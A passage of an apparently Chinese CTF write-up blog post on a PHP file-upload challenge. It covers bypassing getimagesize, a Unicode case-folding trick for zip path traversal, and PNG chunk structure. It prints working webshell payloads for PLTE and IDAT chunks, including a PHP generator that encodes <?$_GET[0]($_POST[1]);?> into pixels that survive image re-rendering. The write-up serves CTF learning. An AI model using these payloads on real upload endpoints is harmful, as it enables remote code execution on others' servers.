+    <span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">){</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">continue</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nv">$first</span> <span class="o">=</span> <span class="nx">imagecreatefrompng</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+        <span class="nv">$size</span> <span class="o">=</span> <span class="nx">min</span><span class="p">(</span><span class="nx">imagesx</span><span class="p">(</span><span class="nv">$first</span><span class="p">),</span> <span class="nx">imagesy</span><span class="p">(</span><span class="nv">$first</span><span class="p">));</span>
+        <span class="nv">$second</span> <span class="o">=</span> <span class="nx">imagecrop</span><span class="p">(</span><span class="nv">$first</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;x&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;y&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;width&#39;</span> <span class="o">=&gt;</span> <span class="nv">$size</span><span class="p">,</span> <span class="s1">&#39;height&#39;</span> <span class="o">=&gt;</span> <span class="nv">$size</span><span class="p">]);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$second</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$final_name</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$file</span><span class="p">)[</span><span class="s2">&#34;basename&#34;</span><span class="p">];</span>
+            <span class="nx">imagepng</span><span class="p">(</span><span class="nv">$second</span><span class="p">,</span> <span class="s1">&#39;example/&#39;</span><span class="o">.</span><span class="nv">$final_name</span><span class="p">);</span>
+            <span class="nx">imagedestroy</span><span class="p">(</span><span class="nv">$second</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="nx">imagedestroy</span><span class="p">(</span><span class="nv">$first</span><span class="p">);</span>
+        <span class="nx">unlink</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+</code></pre></div><h4 id="bypass-image-size">bypass image size</h4>
+<p>上传处对图片的尺寸做出了要求，此时有一种方法来绕过。将下列代码拼接到POST流最后即可绕过 <code>getimagesize</code> 的检测</p>
+<pre><code>#define width 1
+#define height 1
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210516174250.png" alt="img"  /></p>
+<p>经过一番调试，可以用一个txt文件和一个php文件打包一个压缩包上传，也可以直接抓包在POST数据流最后手动加上这两行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210516174522.png" alt="image-20210516174519255"  /></p>
+<h4 id="bypass-zip">bypass zip</h4>
+<p>mb_strtolower可以兼容unicode字符，可以使用unicode字符<code>İ</code>，经过<code>mb_strtolower</code>转换变成小写字母<code>i</code></p>
+<p><a href="https://www.compart.com/en/unicode/U+1D5A8">https://www.compart.com/en/unicode/U+1D5A8</a></p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+    <span class="k">echo</span> <span class="nx">mb_strtolower</span><span class="p">(</span><span class="s1">&#39;İ&#39;</span><span class="p">);</span> <span class="c1">//i̇
+</span></code></pre></div><p>在example解压的时候自然是<code>../</code>目录穿越解压我们上传的压缩包</p>
+<p>然后就是<code>imagecreatefrompng</code>，这个函数只要你确确实实是一张图片(也就是Windows下改后缀为png，能正常打开)就可以过，之后他使用<code>imagepng</code>函数把这个文件输出到web路径，不过遗憾的是，经过这个两个函数一读一输出，图片内容会变</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210516175639.png" alt="image-20210516175636078"  /></p>
+<p>也就是说，通过Windows cmd的copy命令生成的图片马，不顶用，得换高级得马儿</p>
+<p>这就是PHP二次渲染绕过。在此之前先插个预备知识，介绍下PNG的构造</p>
+<h4 id="png结构">PNG结构</h4>
+<p>png 支持三种图像类型</p>
+<ul>
+<li>索引彩色图像(index-color images)</li>
+<li>灰度图像(grayscale images)</li>
+<li>真彩色图像(true-color images)</li>
+</ul>
+<h5 id="png-标识">png 标识</h5>
+<p>png 标识作为 png 图片的头部，为固定的 8 字节</p>
+<pre><code>89 50 4E 47 OD 0A 1A 0A
+</code></pre><h5 id="数据块">数据块</h5>
+<p>png 定义了两种类型的数据块，一种是称为关键数据块(critical chunk)，标准的数据块; 另一种叫做辅助数据块(ancillary chunks)，可选的数据块。</p>
+<p>关键数据块定义了3个标准数据块，每个 png 文件都必须包含它们。3个标准数据块为: <code>IHDR， IDAT， IEND</code></p>
+<p>这里介绍4个：</p>
+<ul>
+<li>
+<p>文件头数据块<code>IHDR</code>(header chunk)</p>
+</li>
+<li>
+<p>调色板数据块<code>PLTE</code>(palette chunk)</p>
+</li>
+<li>
+<p>图像数据块<code>IDAT</code>(image data chunk)</p>
+</li>
+<li>
+<p>图像结束数据<code>IEND</code>(image trailer chunk)</p>
+</li>
+</ul>
+<p>每个数据块都由下表所示的的4个域组成。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">名称</th>
+<th style="text-align:center">字节数</th>
+<th style="text-align:center">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">Length(长度)</td>
+<td style="text-align:center">4字节</td>
+<td style="text-align:center">指定数据块中数据域的长度，其长度不超过$(2^{31}-1)$字节</td>
+</tr>
+<tr>
+<td style="text-align:center">Chunk Type Code(数据块类型码)</td>
+<td style="text-align:center">4字节</td>
+<td style="text-align:center">数据块类型码由ASCII字母(A-Z和a-z)组成</td>
+</tr>
+<tr>
+<td style="text-align:center">Chunk Data(数据块实际内容)</td>
+<td style="text-align:center">可变长度</td>
+<td style="text-align:center">存储按照Chunk Type Code指定的数据</td>
+</tr>
+<tr>
+<td style="text-align:center">CRC(循环冗余检测)</td>
+<td style="text-align:center">4字节</td>
+<td style="text-align:center">存储用来检测是否有错误的循环冗余码</td>
+</tr>
+</tbody>
+</table>
+<p>其中CRC(cyclic redundancy check)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的，可以看做一种校验码</p>
+<hr>
+<ul>
+<li>
+<p>文件头数据块<strong>IHDR</strong>(header chunk)：</p>
+<p>它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</p>
+</li>
+<li>
+<p>调色板数据块<strong>PLTE</strong>(palette chunk)：</p>
+<p>它包含有与索引彩色图像((indexed-color image))相关的彩色变换数据，它仅与索引彩色图像有关，而且要放在图像数据块(image data chunk)之前。真彩色的PNG数据流也可以有调色板数据块，目的是便于非真彩色显示程序用它来量化图像数据，从而显示该图像。结构如下：</p>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">颜色</th>
+<th style="text-align:center">字节</th>
+<th style="text-align:center">意义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">Red</td>
+<td style="text-align:center">1 byte</td>
+<td style="text-align:center">0 = 黑色, 255 = 红</td>
+</tr>
+<tr>
+<td style="text-align:center">Green</td>
+<td style="text-align:center">1 byte</td>
+<td style="text-align:center">0 = 黑色, 255 = 绿色</td>
+</tr>
+<tr>
+<td style="text-align:center">Blue</td>
+<td style="text-align:center">1 byte</td>
+<td style="text-align:center">0 = 黑色, 255 = 蓝色</td>
+</tr>
+</tbody>
+</table>
+<pre><code>PLTE数据块是定义图像的调色板信息，PLTE可以包含1~256个调色板信息，每一个调色板信息由3个字节组成，因此调色板数据块所包含的最大字节数为768，调色板的长度应该是3的倍数，否则，这将是一个非法的调色板。
+
+对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4=16），否则，这将导致PNG图像不合法。
+</code></pre>
+<ul>
+<li>图像数据块<strong>IDAT</strong>(image data chunk)：</li>
+</ul>
+<p>它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。</p>
+<p>IDAT存放着图像真正的数据信息</p>
+<ul>
+<li>
+<p>图像结束数据<strong>IEND</strong>(image trailer chunk)：</p>
+<p>它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。</p>
+<pre><code>00 00 00 00 49 45 4E 44 AE 42 60 82
+</code></pre><pre><code>	
+  由于数据块结构的定义，IEND数据块的长度总是0（00 00 00 00，除非人为加入信息），数据标识总是IEND（49 45 4E 44），因此，CRC码也总是AE 42 60 82
+
+
+
+</code></pre></li>
+</ul>
+<h4 id="写思路">写🐎思路</h4>
+<p>了解了png结构之后，我们大概有两种思路构造webshell</p>
+<ol>
+<li>
+<p>向<strong>PLTE</strong>插入php代码</p>
+<p><a href="https://github.com/hxer/imagecreatefrom-/tree/master/png/analysis">https://github.com/hxer/imagecreatefrom-/tree/master/png/analysis</a></p>
+<blockquote>
+<p>分析底层源码可知， png signature 是不可能插入 php 代码的； IHDR 存储的是 png 的图片信息，有固定的长度和格式，程序会提取图片信息数据进行验证，很难插入 php 代码；而 PLTE 主要进行了 CRC 校验和颜色数合法性校验等简单的校验，那么很可能在 data 域插入 php 代码。</p>
+<p>从对 PLTE chunk 验证的分析可知， 当原始图片格式给索引图片时，PLTE 数据块在满足 png 格式规范的情况下，程序还会进行 CRC 校验和长度合法性验证。因此，要将 PHP 代码写入 PLTE 数据块，不仅要修改 data 域的内容为php代码，然后修改 CRC 为正确的 CRC 校验值，当要填充的代码过长时，可以改变 length 域的数值，满足 length 为3的倍数， 且颜色数不超过色深中规定的颜色数。例如: IHDR 数据块中 Bit depth 为 08, 则最大的颜色数为 2^8=256, 那么 PLTE 数据块 data 的长度不超过 3*256=0x300。 这个长度对写入 php 一句话木马或者创建后门文件足够了。</p>
+</blockquote>
+<p>通过文章的exp构造的webshell，能过只有<code>imagecreatefrompng</code>和<code>imagepng</code>的。</p>
+<p>但是经过题目<code>imagecrop</code>这种裁剪，会被有规律的吞掉</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210522224140.png" alt="image-20210522224138197"  /></p>
+<p>解决方案是可以硬调：</p>
+<pre><code>*/$&lt;?=_GET/**/[fghijk;/*(/*rstuvw0])*/e$%^val/*+//
+//就问这是人能调出来的么？&lt;?=eval($_GET[0]);
+</code></pre></li>
+<li>
+<p>向<strong>IDAT</strong>插入php代码</p>
+<p>原理剖析：https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</p>
+<p>exp：https://github.com/huntergregal/PNG-IDAT-Payload-Generator/</p>
+<p>当然也可以使用php版本的exp：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="nv">$p</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span>
+           <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span>
+           <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span>
+           <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span>
+           <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span>
+           <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span>
+           <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span>
+           <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">);</span>
+   
+<span class="nv">$img</span> <span class="o">=</span> <span class="nx">imagecreatetruecolor</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
+   
+<span class="k">for</span> <span class="p">(</span><span class="nv">$y</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$y</span> <span class="o">&lt;</span> <span class="nx">sizeof</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span> <span class="nv">$y</span> <span class="o">+=</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+   <span class="nv">$r</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="p">];</span>
+   <span class="nv">$g</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
+   <span class="nv">$b</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="o">+</span><span class="mi">2</span><span class="p">];</span>
+   <span class="nv">$color</span> <span class="o">=</span> <span class="nx">imagecolorallocate</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span> <span class="nv">$r</span><span class="p">,</span> <span class="nv">$g</span><span class="p">,</span> <span class="nv">$b</span><span class="p">);</span>
+   <span class="nx">imagesetpixel</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span> <span class="nx">round</span><span class="p">(</span><span class="nv">$y</span> <span class="o">/</span> <span class="mi">3</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$color</span><span class="p">);</span>
+<span class="p">}</span>
+   
+<span class="nx">imagepng</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="s1">&#39;wh1sper.php&#39;</span><span class="p">);</span><span class="c1">//要修改的图片的路径
+</span><span class="c1"></span><span class="cm">/* 木马内容
+</span><span class="cm">&lt;?$_GET[0]($_POST[1]);?&gt;
+</span><span class="cm"> */</span>
+</code></pre></div><p>网上的wp大多都用的第二种方法，用python的exp。然后是把<code>$_GET[0]</code>改成了<code>EVAL</code>，然后需要按照算法计算一下crc</p>
+<p><a href="https://blog.csdn.net/miuzzx/article/details/116885083">https://blog.csdn.net/miuzzx/article/details/116885083</a></p>
+<p><a href="https://lemonprefect.cn/zh-cn/posts/7c083fa1#imagecreatefrompng-bypass">https://lemonprefect.cn/zh-cn/posts/7c083fa1#imagecreatefrompng-bypass</a></p>
+<blockquote>
+<p>使用参考的 Repo 中的代码可以生成一个长度为 25 的任意 PHP payload 的正方形图片，只需要将自带的 payload 经过 Raw Deflate 之后再 Inflate 即可</p>
+</blockquote>
+</li>
+</ol>
+<h4 id="题外话">题外话</h4>
+<p>这个姿势并不是新东西，在upload-labs17和DDCTF都出现过，没做出来还是说明题刷少了</p>
+<p>另外还有其他图片的二次渲染具体可以看看：https://www.sqlsec.com/2020/10/upload.html#toc-heading-17</p>
+<h3 id="挖坑">挖坑</h3>
+<p>这次国赛题目顶啊，后面的每道题都蛮不错的，可惜不知道有没有机会了，等以后有缘就冲了他</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a>
+        
+            <a href="/tags/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/">无列名注入</a>
+        
+            <a href="/tags/reflectionmethod/">ReflectionMethod</a>
+        
+            <a href="/tags/imagecreatefrom/">imagecreatefrom</a>
+        
+            <a href="/tags/session.upload_progress/">session.upload_progress</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3&#43;Aro6EYUG4&#43;cU&#43;KJWu/X"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js"integrity="sha384-g7c&#43;Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI&#43;sEnkvrMWph2EDg4"crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js"integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC&#43;Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa"crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        renderMathInElement(document.querySelector(`.article-content`), {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ]
+        });})
+</script>
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/wmctf2020/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228100849.jpeg" loading="lazy" data-key="" data-hash="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228100849.jpeg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">W&amp;MCTF2020</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+
+    
+        
+    <div class="disqus-container">
+    
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2019 - 
+        
+        2021 wh1sper
+    </section>
+    
+    <section class="powerby">
+        
+            welcome to wh1sper's blog <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+            </main>
+    
+    
+    <aside class="sidebar right-sidebar sticky">
+        
+            <form action="/search/" class="search-form widget" >
+        <p>
+            <label>搜索</label>
+            <input name="keyword" required placeholder="输入关键词..." />
+        
+            <button title="搜索">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+            </button>
+        </p>
+    </form>
+        
+            <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-infinity" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M9.828 9.172a4 4 0 1 0 0 5.656 a10 10 0 0 0 2.172 -2.828a10 10 0 0 1 2.172 -2.828 a4 4 0 1 1 0 5.656a10 10 0 0 1 -2.172 -2.828a10 10 0 0 0 -2.172 -2.828" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">归档</h2>
+
+        
+        
+        
+        
+        
+        <div class="widget-archive--list">
+            <div class="archives-year">
+                    <a href="/archives/#2021">
+                        
+                            <span class="year">2021</span>
+                            <span class="count">8</span>
+                        
+                    </a> 
+                </div>
+            <div class="archives-year">
+                    <a href="/archives/#2020">
+                        
+                            <span class="year">2020</span>
+                            <span class="count">36</span>
+                        
+                    </a> 
+                </div>
+            <div class="archives-year">
+                    <a href="/archives/#2019">
+                        
+                            <span class="year">2019</span>
+                            <span class="count">1</span>
+                        
+                    </a> 
+                </div>
+            
+        </div>
+    </section>
+        
+            <section class="widget tagCloud">
+    <div class="widget-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11 3L20 12a1.5 1.5 0 0 1 0 2L14 20a1.5 1.5 0 0 1 -2 0L3 11v-4a4 4 0 0 1 4 -4h4" />
+  <circle cx="9" cy="9" r="2" />
+</svg>
+
+
+
+    </div>
+    <h2 class="widget-title section-title">标签云</h2>
+
+    <div class="tagCloud-tags">
+        
+            <a href="/tags/sqli/" class="font_size_8">
+                SQLi
+            </a>
+        
+            <a href="/tags/rce-bypass/" class="font_size_5">
+                RCE bypass
+            </a>
+        
+            <a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="font_size_4">
+                PHP反序列化
+            </a>
+        
+            <a href="/tags/ssrf/" class="font_size_4">
+                SSRF
+            </a>
+        
+            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="font_size_4">
+                代码审计
+            </a>
+        
+            <a href="/tags/cve/" class="font_size_3">
+                CVE
+            </a>
+        
+            <a href="/tags/hackthebox/" class="font_size_3">
+                HackTheBox
+            </a>
+        
+            <a href="/tags/nodejs/" class="font_size_3">
+                NodeJS
+            </a>
+        
+            <a href="/tags/phar/" class="font_size_3">
+                phar
+            </a>
+        
+            <a href="/tags/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="font_size_3">
+                python反序列化
+            </a>
+        
+            <a href="/tags/redis/" class="font_size_3">
+                Redis
+            </a>
+        
+            <a href="/tags/webcrypto/" class="font_size_3">
+                WebCrypto
+            </a>
+        
+            <a href="/tags/xxe/" class="font_size_3">
+                XXE
+            </a>
+        
+            <a href="/tags/flask/" class="font_size_2">
+                flask
+            </a>
+        
+            <a href="/tags/session.upload_progress/" class="font_size_2">
+                session.upload_progress
+            </a>
+        
+            <a href="/tags/ssti/" class="font_size_2">
+                SSTI
+            </a>
+        
+            <a href="/tags/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/" class="font_size_2">
+                伪随机数
+            </a>
+        
+            <a href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" class="font_size_2">
+                堆叠注入
+            </a>
+        
+            <a href="/tags/%E6%8F%90%E6%9D%83/" class="font_size_2">
+                提权
+            </a>
+        
+            <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="font_size_2">
+                文件包含
+            </a>
+        
+    </div>
+</section>
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
